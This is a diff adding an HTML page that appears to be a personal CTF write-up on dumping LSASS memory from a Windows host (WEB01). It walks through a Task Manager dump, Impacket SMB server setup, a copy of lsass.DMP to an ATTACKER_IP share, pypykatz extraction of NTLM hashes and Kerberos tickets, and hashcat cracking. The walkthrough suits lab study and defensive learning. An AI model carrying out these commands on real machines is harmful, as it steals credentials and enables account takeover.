@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" href="../images/icone.jpg" type="image/png">
+  <title>CTF - LSASS</title>
+  <link rel="stylesheet" href="../stylr.css" />
+</head>
+<body>
+  <div class="project-container">
+<h3 class="typing-line">
+  The goal is to capture a memory snapshot of the LSASS process on a Windows machine<br>
+  and analyze it offline. This makes it easier to review authentication‑related data<br>
+  without spending too much time on the target system.
+</h3>   
+    <style>
+    h3 {
+      font-family: 'Courier New', monospace;
+      color: #00e5c8;
+    }
+  </style>
+
+    <img src="images/ls.png" alt="Firewall" width="500" height="250" />   
+
+    <p>I had valid credentials for the target machine (WEB01) and I connected to it using Remote Desktop Protocol (RDP).<br>
+        mstsc /v:WEB01<br>
+    </p>
+
+    <p><strong>Creating an LSASS memory dump (snapshot)</strong><br> 
+        When I had an interactive session, I simply opened Task Manager (Ctrl+Shift+Esc), went to the Processes tab, and right‑clicked on Local Security Authority Process (lsass.exe) to create a dump file.<br>
+        Windows saved the file as lsass.DMP in the user’s temporary directory<br> 
+        <span style="color: #0f0;">C:\Users&gt;User&gt;\AppData\Local\Temp\lsass.DMP</span><br>           
+        CLI method — when no GUI is available or using automation:<br>
+
+        Identify LSASS PID (tasklist /svc or Get-Process lsass), then use a minidump utility (procdump, or other admin tools). Note: such methods are often flagged by AV/EDR.<br>
+        Note: Creating LSASS dumps requires administrative privileges. Modern endpoint protections (LSA Protection, Credential Guard, EDR) may block or detect these actions.<br>
+        </p>
+
+    <p><strong>Prepare the attacker host to receive the dump (SMB example)</strong> <br> 
+        
+        On your attacker Linux machine, create a reception folder and run a simple SMB server (Impacket example):<br>
+
+        start SMB server (leave terminal open)
+        <span style="color: #0f0;">sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/&gt;your_user&gt;/Documents/</span><br>
+        What this does: shares /home/&gt;your_user&gt;/Documents as \\&gt;ATTACKER_IP&gt;\CompData. The target can write lsass.DMP to that share.<br>
+    </p>
+
+
+
+    <p><strong>Transfer the dump from the target to attacker (Windows side)</strong> <br>
+        Direct UNC copy (no mapping):<br>
+
+        <span style="color: #0f0;">copy "C:\Users\----\AppData\Local\Temp\lsass.DMP" \\&gt;ATTACKER_IP&gt;\CompData\lsass.DMP</span><br>
+
+        Verify and protect the received dump (attacker host)<br>
+    </p>
+
+
+
+    <p><strong>Offline parsing of the dump with pypykatz</strong> <br>
+        <span style="color: #0f0;">pypykatz lsa minidump /home/<your_user>/Documents/lsass.DMP</span><br>
+        What pypykatz prints (anonymized):<br>
+        <p style="margin-bottom: 1em;"></p>
+        - LogonSession records (username, domain, SID, LUID)<br>
+        - MSV entries (NTLM / NT hash stored in memory)<br>
+        - WDIGEST entries (may contain clear-text passwords on older/legacy systems)<br>
+        - Kerberos tickets / keys<br>
+        - DPAPI masterkeys and GUIDs<br>
+
+</p>
+
+    <p><strong>Cracking NT hashes</strong> <br><br>
+        run hashcat (mode 1000 = NTLM)<br>
+        <span style="color: #0f0;"></span>sudo hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt</span><br>
+    </p>
+
+
+    <a href="../index.html" class="back" style="color:#00e5c8; text-shadow:0 0 5px #00e5c8; transition:0.3s;">← Back Home</a>   
+  </div>
+</body>
+</html> 
